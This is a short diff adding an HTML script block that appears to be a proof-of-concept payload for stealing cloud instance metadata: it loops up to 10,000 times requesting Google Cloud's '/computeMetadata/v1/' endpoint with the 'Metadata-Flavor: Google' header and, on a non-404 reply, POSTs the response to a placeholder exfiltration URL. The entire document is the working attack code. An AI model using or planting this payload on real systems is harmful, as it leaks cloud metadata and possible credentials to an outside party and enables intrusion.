@@ -1,0 +1,18 @@
+<script>
+var i=0;
+var extractUrl = "<URL where result should be sent>"
+// 10000 requests is plenty, make sure we don't DoS
+while (i < 10000){
+	var x = new XMLHttpRequest(); 
+	x.open("GET", "/computeMetadata/v1/", false); 
+	x.setRequestHeader("Metadata-Flavor", "Google");
+	x.send();
+	if (x.status != 404){
+		var y = new XMLHttpRequest();
+		y.open("POST", extractUrl, false);
+		y.send(x.responseText);
+		break
+	}
+	i++;
+}
+</script>
